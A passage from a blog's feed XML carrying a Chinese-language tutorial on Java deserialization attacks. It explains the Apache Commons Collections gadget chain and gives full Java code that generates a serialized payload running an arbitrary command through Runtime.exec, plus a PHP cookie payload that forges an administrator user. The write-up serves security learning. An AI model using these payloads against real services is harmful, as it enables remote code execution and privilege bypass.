href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li><li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文源于老外 &lt;a href=&quot;https://twitter.com/nvisium&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@nvisium&lt;/a&gt; 在其博客发表的博文 &lt;a href=&quot;https://nvisium.com/blog/2015
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="ssti" scheme="http://rickgray.me/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>从反序列化到命令执行 - Java 中的 POP 执行链</title>
    <link href="http://rickgray.me/2015/11/25/untrusted-deserialization-exploit-with-java/"/>
    <id>http://rickgray.me/2015/11/25/untrusted-deserialization-exploit-with-java/</id>
    <published>2015-11-24T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
    <content type="html"><![CDATA[<p>作为一名不会 Java %!@#&amp;，仅以此文记录下对 Java 反序列化利用的学习和研究过程。</p><h3 id="一、什么是序列化"><a href="#一、什么是序列化" class="headerlink" title="一、什么是序列化"></a>一、什么是序列化</h3><p>序列化常用于将程序运行时对象的状态以二进制形式存储于文件系统中，然后在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。简单的说就是可以基于序列化数据实时在两个程序中传递程序对象。</p><h4 id="1-Java-序列化示例"><a href="#1-Java-序列化示例" class="headerlink" title="1. Java 序列化示例"></a>1. Java 序列化示例</h4><p><img src="/images/articles/2015-11-25-untrusted-deserialization-exploit-with-java/1.png" alt=""></p><p>上面是一段简单的 Java 反序列化应用的示例。第一段代码里面，程序将实例对象 <code>String(&quot;This is String object!&quot;)</code> 通过 <code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 函数写到了文件里。序列化对象在具有一定的二进制结构，以十六进制格式查看存储了序列化对象的文件，除了包含一些字符串常量以外，还能看到其具有不可打印的字符在里面，而这些字符就是用来描述其序列化结构的。（关于序列化格式的相关信息可以参考<a href="https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html#8130" target="_blank" rel="noopener">官方文档</a>）</p><h4 id="2-Java-序列化特征"><a href="#2-Java-序列化特征" class="headerlink" title="2. Java 序列化特征"></a>2. Java 序列化特征</h4><p>在序列化对象数据中，头4个字节存储的是 Java 序列化对象数据特有的 Magic Number 和相应的协议版本，通常为：</p><pre><code>0xaced (Magic Number)0x0005 (Version Number)</code></pre><p>在具体序列化一个对象时，会遵循序列化协议进行数据封装。扯得有点远了，对 Java 序列化对象数据结构的研究不在本文范围内，官方文档有较为详细的说明，有需要的可以自行查阅。这里我们只需要知道，序列化后的 Java 对象二进制数据通常以 <code>0xaced0005</code> 这 4 个字节开始就可以了。对 Java 应用序列化对象交互的接口寻找就可以通过监测这 4 个特殊字节来进行。</p><p>Java 里，可以序列化一个对象成为具有一定数据格式的二进制数据，也可以从数据流程中恢复一个实例对象。而进行序列化和反序列化时会使用两个类，如下：</p><pre><code>// 序列化对象java.io.ObjectOutputStream    writeObject()    writeUnshared()    ...// 反序列化对象java.io.ObjectInputStream    readObject()    readUnshared()    ...</code></pre><p>当然了，如果开发者对序列化的过程有自己的需求，也可以在对象中重写 <code>writeObject()</code> 和 <code>readObject()</code> 函数，来进行一些特殊的状态和数据的控制。</p><p>如果我们需要寻找某个 Java 应用的序列化数据交互接口时，就可以直接进行全局代码搜索序列化和反序列化中常用的那些函数和方法，当找到 Java 应用的序列化数据交互接口后，便可以开始考虑具体的利用方法了。</p><h3 id="二、反序列化的危害"><a href="#二、反序列化的危害" class="headerlink" title="二、反序列化的危害"></a>二、反序列化的危害</h3><p>若你对 Python 或者 PHP 足够熟悉就应该知道在这两个语言中的反序列化过程都能直接导致代码执行或者命令执行，并且 Python 中要想利用反序列化执行命令或者代码基本没有什么条件限制，只要有反序列化的交互接口就能直接执行命令或者代码。当然了，如果做了其他的一些安全策略，就要根据实际情况来分析了。</p><p>总结一下在各语言中反序列化过程目前可能带来的危害：</p><ol><li>执行逻辑控制（例如变量修改、登陆绕过）</li><li>代码执行</li><li>命令执行</li><li>拒绝服务</li><li>…</li></ol><p>这些安全隐患在大多语言的序列化过程出现后就存在了。成功的利用过程大都需要一定的条件和环境，不是每种语言都能像 Python 那样能给直接执行任意命令或者代码，如同一个栈溢出的利用需要考虑各种堆栈防护机制的问题一样。</p><p>一旦通过某种方法达到了反序列化漏洞可利用的环境和条件，能够进行利用的点就非常多了。</p><p>下面是一段代码是 PHP 代码中将序列化数据以 Cookie 形式存储的实例（user.php）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">private</span> $is_admin = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span> </span>&#123; <span class="keyword">$this</span>-&gt;username = $username; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;is_admin; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $user = <span class="keyword">new</span> User(<span class="string">'Guest'</span>);</span><br><span class="line">    $data = base64_encode(serialize($user));</span><br><span class="line">    setCookie(<span class="string">'user'</span>, $data, time()+<span class="number">3600</span>);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;script&gt;location.href="./user.php"&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">    $user = unserialize(base64_decode($_COOKIE[<span class="string">'user'</span>]));</span><br><span class="line">    <span class="keyword">if</span>($user) &#123;</span><br><span class="line">        <span class="keyword">if</span>($user-&gt;isAdmin()) &#123; <span class="keyword">echo</span> <span class="string">'Welcome Come Back, Admninistrator.'</span>; &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Hello, $user-&gt;username."</span>; &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        initUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; initUser(); &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2015-11-25-untrusted-deserialization-exploit-with-java/2.png" alt=""></p><p>这段代码将用户信息以 <code>base64_encode(serialize($user))</code> 的形式存储于客户端的 <code>$_COOKIE[&#39;data&#39;]</code> 里，对序列化敏感的都知道可以自己构造序列化内容然后传递给服务端，使其改变代码逻辑。使用下面这段代码生成 <code>$is_admin = true</code> 的用户信息：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">'Guest'</span>;</span><br><span class="line">    <span class="keyword">private</span> $is_admin = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> User()));</span><br></pre></td></tr></table></figure><p>用生成好的 Payload 修改 Cookie 后再次访问即可看到 <code>Welcome Come Back, Admninistrator.</code> 的输出信息。</p><p><img src="/images/articles/2015-11-25-untrusted-deserialization-exploit-with-java/3.png" alt=""></p><p>上面这个只是 PHP 中一个简单利用反序列化过程控制代码流程的例子。</p><p>Java 中也可以利用反序列化控制代码流程（传播的毕竟是一个对象实例），<br>但在 Java 中想要随便反序列化一个类实例是不行的，进行反序列化的类必须显示声明 <code>Serializable</code> 接口，这样才允许进行序列化操作。（具体可以参考<a href="http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html" target="_blank" rel="noopener">官方文档</a>）</p><h3 id="三、面向属性编程"><a href="#三、面向属性编程" class="headerlink" title="三、面向属性编程"></a>三、面向属性编程</h3><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h4><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p><p><img src="/images/articles/2015-11-25-untrusted-deserialization-exploit-with-java/4.png" alt=""></p><p>从上面这幅图可以知道 ROP 与 POP 极其相似，但 ROP 关注的更为底层，而 POP 只关注上层语言中对象与对象之间的调用关系。</p><h4 id="2-POP-示例-amp"><a href="#2-POP-示例-amp" class="headerlink" title="2. POP 示例 &amp;"></a>2. POP 示例 &amp;</h4><p>之前所写的<a href="http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce.html">《unserialize() 实战之 vBulletin 5.x.x 远程代码执行》</a>就是一个 PHP 中反序列化过程 POP 执行链构造的例子，有兴趣的可以浏览一下，这里就不再给出具体的 POP 示例了。</p><h3 id="四、Java-反序列化利用"><a href="#四、Java-反序列化利用" class="headerlink" title="四、Java 反序列化利用"></a>四、Java 反序列化利用</h3><p>前面讲了这么多也算是自己在研究老外对 Java 反序列化利用时学习和总结出的一些必要知识，下面就来说说从 Java 反序列化到任意命令执行的利用过程。</p><p>本年 1 月 AppSec2015 上 <a href="https://twitter.com/frohoff" target="_blank" rel="noopener">@gebl</a> 和 <a href="https://twitter.com/gebl" target="_blank" rel="noopener">@frohoff</a> 所讲的 <a href="http://frohoff.github.io/appseccali-marshalling-pickles/" target="_blank" rel="noopener">《Marshalling Pickles》</a> 提到了基于 Java 的一些通用库或者框架能够构建出一组 POP 链使得 Java 应用在反序列化的过程中触发任意命令执行，同时也给出了相应的 Payload 构造工具 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>。时隔 10 月国外 FoxGlove 安全团队也发表<a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">博文</a>提到一部分流行的 Java 容器和框架使用了可以构造出能够导致任意命令执行 POP 链的通用库，也针对每种受影响的 Java 容器或框架从漏洞发现、分析到具体的利用构造都进行了详细的说明，并在 Github 上放出了相应的 <a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">PoC</a>。能够成功构造出任意命令执行调用链的通用库和框架如下：</p><ol><li>Spring Framework &lt;= 3.0.5，&lt;= 2.0.6；</li><li>Groovy &lt; 2.4.4；</li><li>Apache Commons Collections &lt;= 3.2.1，&lt;= 4.0.0；</li><li>More to come …</li></ol><p>（PS：这些框架或者通用库辅助构造可导致命令执行 POP 链的环境而已，反序列化漏洞的根源是因为不可信的输入和未检测反序列化对象安全性造成的。）</p><p>大多讲解和分析 Java 反序列化到任意命令执行的文章中，都提到了 Apache Commons Collections 这个 Java 库，因其 POP 链构造过程在自己学习和研究过程中是最容易理解的一个，所以下面也只分析基于 Apache Commons Collections 3.x 版本的 Gadget 构造过程。</p><h4 id="1-InvokerTransformer-transform-反射调用"><a href="#1-InvokerTransformer-transform-反射调用" class="headerlink" title="1. InvokerTransformer.transform() 反射调用"></a>1. InvokerTransformer.transform() 反射调用</h4><p>在使用 Apache Commons Collections 库进行 Gadget 构造时主要利用了其 Transformer 接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要用于将一个对象通过 <code>transform</code> 方法转换为另一个对象，而在库中众多对象转换的接口中存在一个 <code>Invoker</code> 类型的转换接口 <code>InvokerTransformer</code>，并且同时还实现了 <code>Serializable</code> 接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">...省略...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();  <span class="comment">// 反射获取类</span></span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);  <span class="comment">// 反射得到具有对应参数的方法</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);  <span class="comment">// 使用对应参数调用方法，并返回相应调用结果</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">...省略...</span><br></pre></td></tr></table></figure><p>可以看到 <code>InvokerTransformer</code> 类中实现的 <code>transform()</code> 接口使用 Java 反射机制获取反射对象 <code>input</code> 中的参数类型为 <code>iParamTypes</code> 的方法 <code>iMethodName</code>，然后使用对应参数 <code>iArgs</code> 调用获取的方法，并将执行结果返回。由于其实现了 <code>Serializable</code> 接口，因此其中的三个必要参数 <code>iMethodName</code>、<code>iParamTypes</code> 和 <code>iArgs</code> 都是可以通过序列化直接构造的，为命令执行创造的决定性的条件。</p><p>然后要想利用 <code>InvokerTransformer</code> 类中的 <code>transform()</code> 来达到任意命令执行，还需要一个入口点，使得应用在反序列化的时候能够通过一条调用链来触发 <code>InvokerTransformer</code> 中的 <code>transform()</code> 接口。</p><p>然而在 Apache Commons Collections 里确实存在这样的调用，其一是位于 <code>TransformedMap</code> 类中的 <code>checkSetValue()</code> 方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">...省略...</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而 <code>TransformedMap</code> 实现了 <code>Map</code> 接口，而在对字典键值进行 <code>setValue()</code> 操作时会调用 <code>valueTransformer.transform(value)</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...省略...</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>好的，现在已经找到了反射调用的上一步调用，这里为了多次进行多次反射调用，我们可以将多个 <code>InvokerTransformer</code> 实例级联在一起组成一个 <code>ChainedTransformer</code> 对象，在其调用的时候会进行一个级联 <code>transform()</code> 调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">...省略...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>现在已经可以造出一个 <code>TransformedMap</code> 实例，在对字典键值进行 <code>setValue()</code> 操作时候调我们构造的 <code>ChainedTransformer</code>，下面给出示例代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exserial.examples;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SetValueToExec</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = (args.length != <span class="number">0</span>) ? args[<span class="number">0</span>] : <span class="string">"/bin/sh,-c,open /Applications/Calculator.app"</span>;</span><br><span class="line">        String[] execArgs = command.split(<span class="string">","</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;execArgs&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</span><br><span class="line">        Map tempMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        exMap.put(<span class="string">"1111"</span>, <span class="string">"2222"</span>);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; exMapValue : exMap.entrySet()) &#123;</span><br><span class="line">            exMapValue.setValue(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据之前的分析，将上面这段代码编译运行后会默认会弹出计算器，对代码详细执行过程有疑惑的可以通过单步调试进行测试：</p><p><img src="/images/articles/2015-11-25-untrusted-deserialization-exploit-with-java/5.png" alt=""></p><p>然后我们现在只是测试了使用 <code>TransformedMap</code> 进行任意命令执行而已，要想在 Java 应用反序列化的过程中触发该过程还需要找到一个类，它能够在反序列化调用 <code>readObject()</code> 的时候调用 <code>TransformedMap</code> 内置类 <code>MapEntry</code> 中的 <code>setValue()</code> 函数，这样才能构成一条完整的 Gadget 调用链。恰好在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类具有 <code>Map</code> 类型的参数，并且在 <code>readObject()</code> 方法中触发了上面所提到的所有条件，其源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> </span>&#123;</span><br><span class="line">    ...省略...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) || value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到 <code>memberValue</code> 是 <code>AnnotationInvocationHandler</code> 类中类型声明为 <code>Map&lt;String, Object&gt;</code> 的成员变量，刚好和之前构造的 <code>TransformedMap</code> 类型相符，因此我们可以通过 Java 的反射机制动态的获取 <code>AnnotationInvocationHandler</code> 类，使用精心构造好的 <code>TransformedMap</code> 作为它的实例化参数，然后将实例化的 <code>AnnotationInvocationHandler</code> 进行序列化得到二进制数据，最后传递给具有相应环境的序列化数据交互接口使之触发命令执行的 Gadget，完整代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> exserial.payloads.utils.Serializables;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getAnnotationInvocationHandler</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] execArgs = command.split(<span class="string">","</span>);</span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;execArgs&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</span><br><span class="line">        Map tempMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        tempMap.put(<span class="string">"value"</span>, <span class="string">"does't matter"</span>);</span><br><span class="line">        Map exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, exMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = (args.length != <span class="number">0</span>) ? args[<span class="number">0</span>] : <span class="string">"/bin/sh,-c,open /Applications/Calculator.app"</span>;</span><br><span class="line"></span><br><span class="line">        Object obj = getAnnotationInvocationHandler(command);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(System.out);</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终用一段调用链可以清晰的描述整个命令执行的触发过程：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">                AbstractInputCheckedMapDecorator$MapEntry.setValue()</span></span><br><span class="line"><span class="comment">                    TransformedMap.checkSetValue()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Requires:</span></span><br><span class="line"><span class="comment">        commons-collections &lt;= 3.2.1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="五、总结"><a href="#五、总结" class="headerlink" 